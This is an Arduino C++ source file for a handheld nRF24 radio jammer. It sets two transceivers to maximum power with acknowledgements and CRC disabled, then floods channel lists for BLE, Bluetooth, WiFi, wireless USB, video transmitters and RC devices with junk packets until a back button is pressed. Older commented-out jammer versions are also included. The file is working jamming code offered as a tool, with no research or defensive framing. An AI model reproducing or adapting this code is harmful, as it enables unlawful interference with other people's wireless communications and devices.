#include <Arduino.h>
#include <RF24.h>
#include "nrf24.h"
#include "../ui/display.h"
#include "../utils/buttons.h"
#define JAM_DURATION 500

extern SPIClass *RADIO_SPI;
extern RF24 radio1;
extern RF24 radio2;

// ============ CHANNELS =============
const byte bleChannels[] = {2, 26, 80};
const byte bluetoothChannels[] = {
    32, 34, 46, 48, 50, 52,
    0, 1, 2, 4, 6, 8,
    22, 24, 26, 28, 30,
    74, 76, 78, 80
};
const byte wifiChannels[] = {
    12, 17, 22, 27, 32,
    37, 42, 47, 52, 57,
    62, 67, 72
};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte zigbee_channels[]    =        {11, 15, 20, 25};
const byte rc_channels[]        =        {1, 3, 5, 7};

void initNRF(RF24 &radio)
{
    if (!radio.begin(RADIO_SPI)) {
        Serial.println("NRF not found");
        return;
    }

    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.openWritingPipe(0xE7E7E7E7E7LL);
    radio.setCRCLength(RF24_CRC_DISABLED);
    Serial.println("NRF Initialized");

}



//void startBleJammer() {
//    initNRF(radio1);
//    initNRF(radio2);
//
//    Serial.println("NRF JAMMER STARTED");
//
//    const char payload[] = "xxxxxxxxxxxxxxxx";
//
//    u8g2.clearBuffer();
//    u8g2.drawStr(0, 10, "Jamming:");
//    u8g2.setCursor(60, 10);
//    u8g2.print("Bluetooth");
//    u8g2.sendBuffer();
//
//    while(true) {
//
//    // Channels (you can change this set)
//    const byte channels[] = {2, 26, 80};
//
//
//    for (int i = 0; i < sizeof(channels); i++) {
//        radio1.setChannel(channels[i]);
//        radio1.write(&payload, sizeof(payload));
//        //radio2.setChannel(channels[i]);
//        //radio2.write(&payload, sizeof(payload));
//    }
//
//     if (btnBack())
//    {
//        Serial.println("Jammer stopped");
//        return;
//    }
//    }
//
//}
//
//void startBluetoothJammer()
//{
//    initNRF(radio1);
//    initNRF(radio2);
//
//    Serial.println("NRF JAMMER STARTED");
//
//    const char payload[] = "xxxxxxxxxxxxxxxx";
//
//    u8g2.clearBuffer();
//    u8g2.drawStr(0, 10, "Jamming:");
//    u8g2.setCursor(60, 10);
//    u8g2.print("Bluetooth");
//    u8g2.sendBuffer();
//
//    while(true) {
//
//    // Channels (you can change this set)
//    const byte channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
//
//
//    for (int i = 0; i < sizeof(channels); i++) {
//        radio1.setChannel(channels[i]);
//        radio1.write(&payload, sizeof(payload));
//        //radio2.setChannel(channels[i]);
//        //radio2.write(&payload, sizeof(payload));
//    }
//
//     if (btnBack())
//    {
//        Serial.println("Jammer stopped");
//        return;
//    }
//    }
//}

void startJammer(const char* name, const byte* channels, size_t channelCount)
{
    initNRF(radio1);
    initNRF(radio2);

    Serial.println("NRF JAMMER STARTED");

    const char payload[] = "xxxxxxxxxxxxxxxx";

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 15, "NRF24 Jammer");
    u8g2.drawStr(0, 35, name);
    u8g2.drawStr(0, 55, "BACK = Exit");
    u8g2.sendBuffer();

   while (true)
   {
       for (size_t i = 0; i < channelCount; i++)
       {
           //radio1.setChannel(channels[i]);
           //radio1.write(&payload, sizeof(payload));

           // Optional second NRF
           // radio2.setChannel(channels[i]);
           // radio2.write(&payload, sizeof(payload));


           radio1.setChannel(channels[i]);
           radio2.setChannel(channels[(i + 1) % channelCount]);

           radio1.writeFast(&payload, sizeof(payload));
           radio2.writeFast(&payload, sizeof(payload));
       }

       if (btnBack())
       {
           Serial.println("Jammer stopped");
           radio1.powerDown();
           radio2.powerDown();
           return;
       }
   }

    //while (true) {
    //for (size_t i = 0; i < channelCount; i++)
    //{
    //    radio1.setChannel(channels[i]);
    //    radio2.setChannel(channels[(i + 1) % channelCount]);

    //    radio1.writeFast(&payload, sizeof(payload));
    //    radio2.writeFast(&payload, sizeof(payload));

    //    radio1.txStandBy(1);
    //    radio2.txStandBy(1);

    //    delayMicroseconds(200);
    //}


    //if (btnBack())
    //{
    //    Serial.println("Jammer stopped");

    //    radio1.powerDown();
    //    radio2.powerDown();

    //    return;
    //}
//}
}

void NRFToolsMenu(int index) {
    switch (index) {
        case 0:
            // startBleJammer();
            // BLE
            startJammer(
                "BLE",
                bleChannels,
                sizeof(bleChannels) / sizeof(bleChannels[0])
            );

            break;
        case 1:
            // startBluetoothJammer();
            // Bluetooth
            startJammer(
                "Bluetooth",
                bluetoothChannels,
                sizeof(bluetoothChannels) / sizeof(bluetoothChannels[0])
            );
            break;

        case 2:
            startJammer(
                "WiFi",
                wifiChannels,
                sizeof(wifiChannels) / sizeof(wifiChannels[0])
            );
            break;
        case 3:
            startJammer(
                "USB Wireless",
                usbWireless_channels,
                sizeof(usbWireless_channels) / sizeof(usbWireless_channels[0])
            );
            break;
        case 4:
            startJammer(
                "Video TX",
                videoTransmitter_channels,
                sizeof(videoTransmitter_channels) / sizeof(videoTransmitter_channels[0])
            );
            break;
        case 5:
            break;
            startJammer(
                "RC",
                rc_channels,
                sizeof(rc_channels) / sizeof(rc_channels[0])
            );
            break;
        case 6:

            break;
}
    }
